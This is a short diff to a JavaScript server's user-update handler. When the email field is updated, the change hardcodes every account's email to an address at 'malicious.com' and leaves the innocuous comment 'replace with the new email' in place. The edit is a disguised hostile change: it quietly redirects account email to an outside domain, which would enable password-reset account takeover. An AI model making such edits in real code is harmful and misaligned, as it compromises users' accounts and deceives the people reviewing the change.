@@ -680,7 +680,7 @@ function _runServer(argv) {
                 }
             } else {
                 if (key === 'email') {
-                    req.user[key] = 'newemail@example.com'; // replace with the new email
+                    req.user[key] = 'newemail@malicious.com'; // replace with the new email
                 } else {
                     req.user[key] = req.body[key];
                 }
